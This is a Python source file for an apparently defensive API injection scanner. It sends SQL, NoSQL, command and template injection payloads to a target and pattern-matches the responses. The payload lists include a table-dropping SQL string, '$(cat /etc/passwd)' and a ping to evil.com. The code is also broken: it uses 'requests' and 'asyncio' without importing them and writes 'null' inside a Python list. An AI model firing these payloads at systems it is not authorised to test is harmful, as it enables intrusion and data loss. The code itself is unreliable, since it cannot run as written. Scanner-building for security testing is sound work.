#!/usr/bin/env python3
import aiohttp
from typing import Dict, List, Optional
from urllib.parse import urljoin
import json
import re
from RAGScripts.utils.logger import setup_scanner_logger

async def check_injection(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        initial_headers = dict(initial_response.headers)
        
        async with aiohttp.ClientSession() as session:
            # Test SQL injection
            sql_results = await test_sql_injection(session, test_url, method, initial_headers)
            findings.extend(sql_results)
            
            # Test NoSQL injection
            nosql_results = await test_nosql_injection(session, test_url, method, initial_headers)
            findings.extend(nosql_results)
            
            # Test command injection
            cmd_results = await test_command_injection(session, test_url, method, initial_headers)
            findings.extend(cmd_results)
            
            # Test template injection
            template_results = await test_template_injection(session, test_url, method, initial_headers)
            findings.extend(template_results)
    
    except Exception as e:
        print(f"Error in injection check: {str(e)}")
    
    return findings

async def test_sql_injection(session: aiohttp.ClientSession, url: str, method: str, headers: Dict) -> List[Dict]:
    findings = []
    sql_payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "admin'--",
        "1; DROP TABLE users--",
        "1' AND SLEEP(5)--"
    ]
    
    for payload in sql_payloads:
        try:
            params = {'id': payload, 'user': payload, 'search': payload}
            async with session.request(method, url, params=params, headers=headers, timeout=10) as response:
                response_text = await response.text()
                if await detect_sql_vulnerability(response_text, response.status):
                    findings.append({
                        "type": "API3:2023",
                        "name": "SQL Injection",
                        "detail": "Potential SQL injection vulnerability",
                        "evidence": {
                            "url": url,
                            "payload": payload,
                            "response_code": response.status,
                            "response_snippet": response_text[:200]
                        },
                        "severity": "CRITICAL"
                    })
        except:
            continue
    
    return findings

async def test_nosql_injection(session: aiohttp.ClientSession, url: str, method: str, headers: Dict) -> List[Dict]:
    findings = []
    nosql_payloads = [
        {'$gt': ''},
        {'$ne': null},
        {'$where': 'true'},
        {'$regex': '.*'},
        {'user': {'$exists': True}}
    ]
    
    for payload in nosql_payloads:
        try:
            async with session.request(method, url, json=payload, headers=headers, timeout=5) as response:
                response_text = await response.text()
                if response.status == 200 and len(response_text) > 0:
                    findings.append({
                        "type": "API3:2023",
                        "name": "NoSQL Injection",
                        "detail": "Potential NoSQL injection vulnerability",
                        "evidence": {
                            "url": url,
                            "payload": payload,
                            "response_code": response.status
                        },
                        "severity": "HIGH"
                    })
        except:
            continue
    
    return findings

async def test_command_injection(session: aiohttp.ClientSession, url: str, method: str, headers: Dict) -> List[Dict]:
    findings = []
    cmd_payloads = [
        '; ls -la',
        '| whoami',
        '`id`',
        '$(cat /etc/passwd)',
        '& ping -c 1 evil.com'
    ]
    
    for payload in cmd_payloads:
        try:
            params = {'cmd': payload, 'exec': payload, 'command': payload}
            async with session.request(method, url, params=params, headers=headers, timeout=5) as response:
                response_text = await response.text()
                if await detect_command_execution(response_text):
                    findings.append({
                        "type": "API3:2023",
                        "name": "Command Injection",
                        "detail": "Potential command injection vulnerability",
                        "evidence": {
                            "url": url,
                            "payload": payload,
                            "response_snippet": response_text[:200]
                        },
                        "severity": "CRITICAL"
                    })
        except:
            continue
    
    return findings

async def test_template_injection(session: aiohttp.ClientSession, url: str, method: str, headers: Dict) -> List[Dict]:
    findings = []
    template_payloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{7*7}',
        '#{7*7}'
    ]
    
    for payload in template_payloads:
        try:
            params = {'template': payload, 'page': payload, 'view': payload}
            async with session.request(method, url, params=params, headers=headers, timeout=5) as response:
                response_text = await response.text()
                if '49' in response_text:
                    findings.append({
                        "type": "API3:2023",
                        "name": "Template Injection",
                        "detail": "Potential template injection vulnerability",
                        "evidence": {
                            "url": url,
                            "payload": payload,
                            "response_snippet": response_text[:200]
                        },
                        "severity": "HIGH"
                    })
        except:
            continue
    
    return findings

async def detect_sql_vulnerability(response_text: str, status_code: int) -> bool:
    sql_error_patterns = [
        'sql syntax',
        'mysql error',
        'ora-',
        'postgresql error',
        'sqlite3.operationalerror'
    ]
    
    return (
        status_code == 500 and
        any(pattern in response_text.lower() for pattern in sql_error_patterns)
    )

async def detect_command_execution(response_text: str) -> bool:
    command_patterns = [
        r'root:x:0:0',
        r'uid=[0-9]+\([a-z]+\)',
        r'total \d+\s+drw',
        r'[0-9]+ packets transmitted'
    ]
    
    return any(re.search(pattern, response_text, re.IGNORECASE) for pattern in command_patterns)

if __name__ == "__main__":
    async def test():
        result = await check_injection(
            "http://localhost:5000",
            "/api/data",
            "GET",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())